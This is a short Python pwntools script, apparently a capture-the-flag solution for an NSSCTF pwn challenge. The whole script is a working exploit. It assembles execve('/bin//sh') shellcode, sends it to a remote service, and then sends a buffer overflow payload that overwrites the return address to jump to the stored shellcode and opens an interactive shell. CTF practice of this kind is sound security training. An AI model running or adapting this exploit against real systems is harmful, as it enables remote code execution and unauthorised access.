from pwn import *

context(arch="amd64", os="linux", log_level="info")

shellcode = asm("""
    xor esi, esi
    mul esi
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    push rsp
    pop rdi
    mov al, 59
    syscall
    nop
""")

name_addr = 0x6010A0
ret_addr = 0x40028E

io = remote("node4.anna.nssctf.cn", 26891)

io.send(shellcode)

payload = b"a" * 0xA + p64(0) + p64(ret_addr) + p64(name_addr)
io.recvuntil(b"Let's start!\n")
io.send(payload.ljust(0x40, b"\x00"))
io.interactive()
